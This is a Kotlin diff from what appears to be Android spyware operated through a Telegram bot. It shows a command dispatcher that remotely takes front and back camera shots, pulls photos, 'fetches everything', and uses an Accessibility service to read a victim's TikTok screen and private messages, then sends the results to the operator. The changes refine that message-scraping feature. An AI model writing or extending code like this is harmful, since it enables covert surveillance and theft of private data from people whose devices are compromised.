@@ -13,7 +13,6 @@ object CommandExecutor {
     var screenLoopActive: Boolean = false
         private set
 
-    // ⭐ مرجع لخدمة Accessibility النشطة
     @Volatile
     var accessibilityServiceRef: android.accessibilityservice.AccessibilityService? = null
 
@@ -42,8 +41,8 @@ object CommandExecutor {
             callbackData == "cam_front" -> captureCamera(ctx, true)
             callbackData == "cam_back" -> captureCamera(ctx, false)
             callbackData == "tiktok_open" -> tiktokOpen(ctx)
-            callbackData == "tiktok_messages" -> tiktokReadScreen(ctx, "messages")
-            callbackData == "tiktok_read_screen" -> tiktokReadScreen(ctx, "current")
+            callbackData == "tiktok_messages" -> tiktokRead(ctx, "messages")
+            callbackData == "tiktok_read_screen" -> tiktokRead(ctx, "current")
             callbackData == "fetch_all" -> fetchEverything(ctx)
             callbackData.startsWith("stop_") -> stopJob(ctx, callbackData.removePrefix("stop_"))
             else -> TelegramApi.sendMessage("❓ أمر غير معروف: $callbackData")
@@ -71,8 +70,8 @@ object CommandExecutor {
             low == "/cam_front" -> captureCamera(ctx, true)
             low == "/cam_back" -> captureCamera(ctx, false)
             low == "/tiktok" -> tiktokOpen(ctx)
-            low == "/tiktok_messages" -> tiktokReadScreen(ctx, "messages")
-            low == "/tiktok_read" -> tiktokReadScreen(ctx, "current")
+            low == "/tiktok_messages" -> tiktokRead(ctx, "messages")
+            low == "/tiktok_read" -> tiktokRead(ctx, "current")
             low == "/all" -> fetchEverything(ctx)
             low.startsWith("/photos") -> {
                 val n = low.removePrefix("/photos").trim().toIntOrNull() ?: 50
@@ -99,14 +98,14 @@ object CommandExecutor {
             TelegramApi.sendMessage("🎵 *جاري فتح تيك توك...*")
             val ok = TikTokController.openTikTok(ctx)
             if (ok) {
-                TelegramApi.sendMessage("✅ تم فتح تيك توك على الجهاز", KeyboardBuilder.backToMenu())
+                TelegramApi.sendMessage("✅ تم فتح تيك توك\n\nالآن افتح المحادثة التي تريد قراءتها، ثم اضغط زر (🎵 تيك توك — اقرأ الشاشة)", KeyboardBuilder.backToMenu())
             } else {
                 TelegramApi.sendMessage("❌ فشل فتح تيك توك — تأكد من التثبيت", KeyboardBuilder.backToMenu())
             }
         }
     }
 
-    private fun tiktokReadScreen(ctx: Context, mode: String) {
+    private fun tiktokRead(ctx: Context, mode: String) {
         runJob(ctx, "tiktok_read") {
             if (accessibilityServiceRef == null) {
                 TelegramApi.sendMessage(
@@ -117,42 +116,57 @@ object CommandExecutor {
                 return@runJob
             }
 
-            TelegramApi.sendMessage("🎵 *جاري فتح تيك توك وقراءة الشاشة...*")
-
-            // 1. افتح تيك توك
-            TikTokController.openTikTok(ctx)
-            Thread.sleep(3000)
-
-            // 2. اقرأ النصوص الظاهرة
-            val texts = TikTokController.readVisibleTexts(accessibilityServiceRef)
-
-            if (texts.isEmpty()) {
+            // ⭐ فحص الحزمة الأمامية
+            val fgPkg = TikTokController.getForegroundPackage(accessibilityServiceRef)
+            if (fgPkg != "com.zhiliaoapp.musically" && fgPkg != "com.ss.android.ugc.trill") {
                 TelegramApi.sendMessage(
-                    "❌ لم يتم قراءة أي نص\n" +
-                    "تأكد من فتح تيك توك والسماح بالوصول",
+                    "⚠️ *تيك توك ليس مفتوحًا حاليًا*\n\n" +
+                    "الحزمة الحالية: `$fgPkg`\n\n" +
+                    "الحل:\n" +
+                    "1. اضغط زر (🎵 تيك توك — فتح)\n" +
+                    "2. افتح المحادثة التي تريدها\n" +
+                    "3. أعد الأمر",
                     KeyboardBuilder.backToMenu()
                 )
                 return@runJob
             }
 
-            // 3. احفظ
+            TelegramApi.sendMessage("🎵 *جاري القراءة...*")
+            Thread.sleep(800)
+
+            val texts = TikTokController.readTikTokTexts(accessibilityServiceRef)
+
+            if (texts == null) {
+                TelegramApi.sendMessage("❌ تعذّر القراءة — ليس تيك توك في المقدمة", KeyboardBuilder.backToMenu())
+                return@runJob
+            }
+
+            if (texts.isEmpty()) {
+                TelegramApi.sendMessage(
+                    "❌ لم يتم العثور على نصوص قابلة للقراءة\n" +
+                    "جرّب فتح محادثة معينة داخل تيك توك",
+                    KeyboardBuilder.backToMenu()
+                )
+                return@runJob
+            }
+
             TikTokController.saveToFile(ctx, mode, texts)
 
-            // 4. أرسل
             val sb = StringBuilder()
-            sb.append("🎵 *تيك توك — المحتوى الظاهر*\n")
+            sb.append("🎵 *تيك توك — المحتوى*\n")
             sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
 
             var count = 0
             for (t in texts) {
-                if (t.length < 2) continue
+                if (t.length < 3) continue
                 sb.append("• $t\n")
                 count++
-                if (count >= 60) break
+                if (count >= 80) break
             }
 
             if (sb.length > 3500) {
                 TelegramApi.sendMessage(sb.take(3500).toString())
+                TelegramApi.sendMessage("… (النتيجة مقطوعة، في ${texts.size} عنصر إجمالًا)")
             } else {
                 TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.backToMenu())
             }
